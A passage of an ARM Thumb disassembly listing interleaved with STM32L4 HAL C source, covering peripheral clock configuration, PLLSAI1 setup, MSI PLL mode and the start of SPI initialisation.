 8004838:	687b      	ldr	r3, [r7, #4]
 800483a:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 800483c:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004840:	d106      	bne.n	8004850 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004842:	4b29      	ldr	r3, [pc, #164]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004844:	68db      	ldr	r3, [r3, #12]
 8004846:	4a28      	ldr	r2, [pc, #160]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004848:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 800484c:	60d3      	str	r3, [r2, #12]
 800484e:	e011      	b.n	8004874 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004850:	687b      	ldr	r3, [r7, #4]
 8004852:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004854:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004858:	d10c      	bne.n	8004874 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 800485a:	687b      	ldr	r3, [r7, #4]
 800485c:	3304      	adds	r3, #4
 800485e:	2101      	movs	r1, #1
 8004860:	4618      	mov	r0, r3
 8004862:	f000 f853 	bl	800490c <RCCEx_PLLSAI1_Config>
 8004866:	4603      	mov	r3, r0
 8004868:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 800486a:	7cfb      	ldrb	r3, [r7, #19]
 800486c:	2b00      	cmp	r3, #0
 800486e:	d001      	beq.n	8004874 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004870:	7cfb      	ldrb	r3, [r7, #19]
 8004872:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004874:	687b      	ldr	r3, [r7, #4]
 8004876:	681b      	ldr	r3, [r3, #0]
 8004878:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800487c:	2b00      	cmp	r3, #0
 800487e:	d01c      	beq.n	80048ba <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004880:	4b19      	ldr	r3, [pc, #100]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004882:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004886:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 800488a:	687b      	ldr	r3, [r7, #4]
 800488c:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800488e:	4916      	ldr	r1, [pc, #88]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004890:	4313      	orrs	r3, r2
 8004892:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004896:	687b      	ldr	r3, [r7, #4]
 8004898:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800489a:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 800489e:	d10c      	bne.n	80048ba <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 80048a0:	687b      	ldr	r3, [r7, #4]
 80048a2:	3304      	adds	r3, #4
 80048a4:	2102      	movs	r1, #2
 80048a6:	4618      	mov	r0, r3
 80048a8:	f000 f830 	bl	800490c <RCCEx_PLLSAI1_Config>
 80048ac:	4603      	mov	r3, r0
 80048ae:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80048b0:	7cfb      	ldrb	r3, [r7, #19]
 80048b2:	2b00      	cmp	r3, #0
 80048b4:	d001      	beq.n	80048ba <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 80048b6:	7cfb      	ldrb	r3, [r7, #19]
 80048b8:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 80048ba:	687b      	ldr	r3, [r7, #4]
 80048bc:	681b      	ldr	r3, [r3, #0]
 80048be:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 80048c2:	2b00      	cmp	r3, #0
 80048c4:	d00a      	beq.n	80048dc <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 80048c6:	4b08      	ldr	r3, [pc, #32]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048c8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048cc:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 80048d0:	687b      	ldr	r3, [r7, #4]
 80048d2:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80048d4:	4904      	ldr	r1, [pc, #16]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048d6:	4313      	orrs	r3, r2
 80048d8:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 80048dc:	7cbb      	ldrb	r3, [r7, #18]
}
 80048de:	4618      	mov	r0, r3
 80048e0:	3718      	adds	r7, #24
 80048e2:	46bd      	mov	sp, r7
 80048e4:	bd80      	pop	{r7, pc}
 80048e6:	bf00      	nop
 80048e8:	40021000 	.word	0x40021000

080048ec <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 80048ec:	b480      	push	{r7}
 80048ee:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 80048f0:	4b05      	ldr	r3, [pc, #20]	; (8004908 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 80048f2:	681b      	ldr	r3, [r3, #0]
 80048f4:	4a04      	ldr	r2, [pc, #16]	; (8004908 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 80048f6:	f043 0304 	orr.w	r3, r3, #4
 80048fa:	6013      	str	r3, [r2, #0]
}
 80048fc:	bf00      	nop
 80048fe:	46bd      	mov	sp, r7
 8004900:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004904:	4770      	bx	lr
 8004906:	bf00      	nop
 8004908:	40021000 	.word	0x40021000

0800490c <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 800490c:	b580      	push	{r7, lr}
 800490e:	b084      	sub	sp, #16
 8004910:	af00      	add	r7, sp, #0
 8004912:	6078      	str	r0, [r7, #4]
 8004914:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004916:	2300      	movs	r3, #0
 8004918:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 800491a:	4b74      	ldr	r3, [pc, #464]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 800491c:	68db      	ldr	r3, [r3, #12]
 800491e:	f003 0303 	and.w	r3, r3, #3
 8004922:	2b00      	cmp	r3, #0
 8004924:	d018      	beq.n	8004958 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004926:	4b71      	ldr	r3, [pc, #452]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004928:	68db      	ldr	r3, [r3, #12]
 800492a:	f003 0203 	and.w	r2, r3, #3
 800492e:	687b      	ldr	r3, [r7, #4]
 8004930:	681b      	ldr	r3, [r3, #0]
 8004932:	429a      	cmp	r2, r3
 8004934:	d10d      	bne.n	8004952 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004936:	687b      	ldr	r3, [r7, #4]
 8004938:	681b      	ldr	r3, [r3, #0]
       ||
 800493a:	2b00      	cmp	r3, #0
 800493c:	d009      	beq.n	8004952 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 800493e:	4b6b      	ldr	r3, [pc, #428]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004940:	68db      	ldr	r3, [r3, #12]
 8004942:	091b      	lsrs	r3, r3, #4
 8004944:	f003 0307 	and.w	r3, r3, #7
 8004948:	1c5a      	adds	r2, r3, #1
 800494a:	687b      	ldr	r3, [r7, #4]
 800494c:	685b      	ldr	r3, [r3, #4]
       ||
 800494e:	429a      	cmp	r2, r3
 8004950:	d047      	beq.n	80049e2 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004952:	2301      	movs	r3, #1
 8004954:	73fb      	strb	r3, [r7, #15]
 8004956:	e044      	b.n	80049e2 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004958:	687b      	ldr	r3, [r7, #4]
 800495a:	681b      	ldr	r3, [r3, #0]
 800495c:	2b03      	cmp	r3, #3
 800495e:	d018      	beq.n	8004992 <RCCEx_PLLSAI1_Config+0x86>
 8004960:	2b03      	cmp	r3, #3
 8004962:	d825      	bhi.n	80049b0 <RCCEx_PLLSAI1_Config+0xa4>
 8004964:	2b01      	cmp	r3, #1
 8004966:	d002      	beq.n	800496e <RCCEx_PLLSAI1_Config+0x62>
 8004968:	2b02      	cmp	r3, #2
 800496a:	d009      	beq.n	8004980 <RCCEx_PLLSAI1_Config+0x74>
 800496c:	e020      	b.n	80049b0 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 800496e:	4b5f      	ldr	r3, [pc, #380]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004970:	681b      	ldr	r3, [r3, #0]
 8004972:	f003 0302 	and.w	r3, r3, #2
 8004976:	2b00      	cmp	r3, #0
 8004978:	d11d      	bne.n	80049b6 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 800497a:	2301      	movs	r3, #1
 800497c:	73fb      	strb	r3, [r7, #15]
      }
      break;
 800497e:	e01a      	b.n	80049b6 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004980:	4b5a      	ldr	r3, [pc, #360]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004982:	681b      	ldr	r3, [r3, #0]
 8004984:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004988:	2b00      	cmp	r3, #0
 800498a:	d116      	bne.n	80049ba <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 800498c:	2301      	movs	r3, #1
 800498e:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004990:	e013      	b.n	80049ba <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004992:	4b56      	ldr	r3, [pc, #344]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004994:	681b      	ldr	r3, [r3, #0]
 8004996:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800499a:	2b00      	cmp	r3, #0
 800499c:	d10f      	bne.n	80049be <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 800499e:	4b53      	ldr	r3, [pc, #332]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 80049a0:	681b      	ldr	r3, [r3, #0]
 80049a2:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 80049a6:	2b00      	cmp	r3, #0
 80049a8:	d109      	bne.n	80049be <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 80049aa:	2301      	movs	r3, #1
 80049ac:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 80049ae:	e006      	b.n	80049be <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 80049b0:	2301      	movs	r3, #1
 80049b2:	73fb      	strb	r3, [r7, #15]
      break;
 80049b4:	e004      	b.n	80049c0 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049b6:	bf00      	nop
 80049b8:	e002      	b.n	80049c0 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049ba:	bf00      	nop
 80049bc:	e000      	b.n	80049c0 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049be:	bf00      	nop
    }

    if(status == HAL_OK)
 80049c0:	7bfb      	ldrb	r3, [r7, #15]
 80049c2:	2b00      	cmp	r3, #0
 80049c4:	d10d      	bne.n	80049e2 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 80049c6:	4b49      	ldr	r3, [pc, #292]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 80049c8:	68db      	ldr	r3, [r3, #12]
 80049ca:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 80049ce:	687b      	ldr	r3, [r7, #4]
 80049d0:	6819      	ldr	r1, [r3, #0]
 80049d2:	687b      	ldr	r3, [r7, #4]
 80049d4:	685b      	ldr	r3, [r3, #4]
 80049d6:	3b01      	subs	r3, #1
 80049d8:	011b      	lsls	r3, r3, #4
 80049da:	430b      	orrs	r3, r1
 80049dc:	4943      	ldr	r1, [pc, #268]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 80049de:	4313      	orrs	r3, r2
 80049e0:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 80049e2:	7bfb      	ldrb	r3, [r7, #15]
 80049e4:	2b00      	cmp	r3, #0
 80049e6:	d17c      	bne.n	8004ae2 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 80049e8:	4b40      	ldr	r3, [pc, #256]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 80049ea:	681b      	ldr	r3, [r3, #0]
 80049ec:	4a3f      	ldr	r2, [pc, #252]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 80049ee:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 80049f2:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 80049f4:	f7fc fbc8 	bl	8001188 <HAL_GetTick>
 80049f8:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 80049fa:	e009      	b.n	8004a10 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 80049fc:	f7fc fbc4 	bl	8001188 <HAL_GetTick>
 8004a00:	4602      	mov	r2, r0
 8004a02:	68bb      	ldr	r3, [r7, #8]
 8004a04:	1ad3      	subs	r3, r2, r3
 8004a06:	2b02      	cmp	r3, #2
 8004a08:	d902      	bls.n	8004a10 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004a0a:	2303      	movs	r3, #3
 8004a0c:	73fb      	strb	r3, [r7, #15]
        break;
 8004a0e:	e005      	b.n	8004a1c <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a10:	4b36      	ldr	r3, [pc, #216]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a12:	681b      	ldr	r3, [r3, #0]
 8004a14:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a18:	2b00      	cmp	r3, #0
 8004a1a:	d1ef      	bne.n	80049fc <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004a1c:	7bfb      	ldrb	r3, [r7, #15]
 8004a1e:	2b00      	cmp	r3, #0
 8004a20:	d15f      	bne.n	8004ae2 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004a22:	683b      	ldr	r3, [r7, #0]
 8004a24:	2b00      	cmp	r3, #0
 8004a26:	d110      	bne.n	8004a4a <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a28:	4b30      	ldr	r3, [pc, #192]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a2a:	691b      	ldr	r3, [r3, #16]
 8004a2c:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004a30:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a34:	687a      	ldr	r2, [r7, #4]
 8004a36:	6892      	ldr	r2, [r2, #8]
 8004a38:	0211      	lsls	r1, r2, #8
 8004a3a:	687a      	ldr	r2, [r7, #4]
 8004a3c:	68d2      	ldr	r2, [r2, #12]
 8004a3e:	06d2      	lsls	r2, r2, #27
 8004a40:	430a      	orrs	r2, r1
 8004a42:	492a      	ldr	r1, [pc, #168]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a44:	4313      	orrs	r3, r2
 8004a46:	610b      	str	r3, [r1, #16]
 8004a48:	e027      	b.n	8004a9a <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004a4a:	683b      	ldr	r3, [r7, #0]
 8004a4c:	2b01      	cmp	r3, #1
 8004a4e:	d112      	bne.n	8004a76 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a50:	4b26      	ldr	r3, [pc, #152]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a52:	691b      	ldr	r3, [r3, #16]
 8004a54:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004a58:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a5c:	687a      	ldr	r2, [r7, #4]
 8004a5e:	6892      	ldr	r2, [r2, #8]
 8004a60:	0211      	lsls	r1, r2, #8
 8004a62:	687a      	ldr	r2, [r7, #4]
 8004a64:	6912      	ldr	r2, [r2, #16]
 8004a66:	0852      	lsrs	r2, r2, #1
 8004a68:	3a01      	subs	r2, #1
 8004a6a:	0552      	lsls	r2, r2, #21
 8004a6c:	430a      	orrs	r2, r1
 8004a6e:	491f      	ldr	r1, [pc, #124]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a70:	4313      	orrs	r3, r2
 8004a72:	610b      	str	r3, [r1, #16]
 8004a74:	e011      	b.n	8004a9a <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a76:	4b1d      	ldr	r3, [pc, #116]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a78:	691b      	ldr	r3, [r3, #16]
 8004a7a:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004a7e:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a82:	687a      	ldr	r2, [r7, #4]
 8004a84:	6892      	ldr	r2, [r2, #8]
 8004a86:	0211      	lsls	r1, r2, #8
 8004a88:	687a      	ldr	r2, [r7, #4]
 8004a8a:	6952      	ldr	r2, [r2, #20]
 8004a8c:	0852      	lsrs	r2, r2, #1
 8004a8e:	3a01      	subs	r2, #1
 8004a90:	0652      	lsls	r2, r2, #25
 8004a92:	430a      	orrs	r2, r1
 8004a94:	4915      	ldr	r1, [pc, #84]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a96:	4313      	orrs	r3, r2
 8004a98:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004a9a:	4b14      	ldr	r3, [pc, #80]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a9c:	681b      	ldr	r3, [r3, #0]
 8004a9e:	4a13      	ldr	r2, [pc, #76]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004aa0:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004aa4:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004aa6:	f7fc fb6f 	bl	8001188 <HAL_GetTick>
 8004aaa:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004aac:	e009      	b.n	8004ac2 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004aae:	f7fc fb6b 	bl	8001188 <HAL_GetTick>
 8004ab2:	4602      	mov	r2, r0
 8004ab4:	68bb      	ldr	r3, [r7, #8]
 8004ab6:	1ad3      	subs	r3, r2, r3
 8004ab8:	2b02      	cmp	r3, #2
 8004aba:	d902      	bls.n	8004ac2 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004abc:	2303      	movs	r3, #3
 8004abe:	73fb      	strb	r3, [r7, #15]
          break;
 8004ac0:	e005      	b.n	8004ace <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ac2:	4b0a      	ldr	r3, [pc, #40]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ac4:	681b      	ldr	r3, [r3, #0]
 8004ac6:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004aca:	2b00      	cmp	r3, #0
 8004acc:	d0ef      	beq.n	8004aae <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004ace:	7bfb      	ldrb	r3, [r7, #15]
 8004ad0:	2b00      	cmp	r3, #0
 8004ad2:	d106      	bne.n	8004ae2 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004ad4:	4b05      	ldr	r3, [pc, #20]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ad6:	691a      	ldr	r2, [r3, #16]
 8004ad8:	687b      	ldr	r3, [r7, #4]
 8004ada:	699b      	ldr	r3, [r3, #24]
 8004adc:	4903      	ldr	r1, [pc, #12]	; (8004aec <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ade:	4313      	orrs	r3, r2
 8004ae0:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004ae2:	7bfb      	ldrb	r3, [r7, #15]
}
 8004ae4:	4618      	mov	r0, r3
 8004ae6:	3710      	adds	r7, #16
 8004ae8:	46bd      	mov	sp, r7
 8004aea:	bd80      	pop	{r7, pc}
 8004aec:	40021000 	.word	0x40021000

08004af0 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004af0:	b580      	push	{r7, lr}
 8004af2:	b084      	sub	sp, #16
 8004af4:	af00      	add	r7, sp, #0
 8004af6:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004af8:	687b      	ldr	r3, [r7, #4]
 8004afa:	2b00      	cmp	r3, #0
 8004afc:	d101      	bne.n	8004b02 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004afe:	2301      	movs	r3, #1
 8004b00:	e095      	b.n	8004c2e <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004b02:	687b      	ldr	r3, [r7, #4]
 8004b04:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004b06:	2b00      	cmp	r3, #0
 8004b08:	d108      	bne.n	8004b1c <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004b0a:	687b      	ldr	r3, [r7, #4]
 8004b0c:	685b      	ldr	r3, [r3, #4]
 8004b0e:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004b12:	d009      	beq.n	8004b28 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004b14:	687b      	ldr	r3, [r7, #4]
 8004b16:	2200      	movs	r2, #0
 8004b18:	61da      	str	r2, [r3, #28]
 8004b1a:	e005      	b.n	8004b28 <HAL_SPI_Init+0x38>
  else
  {
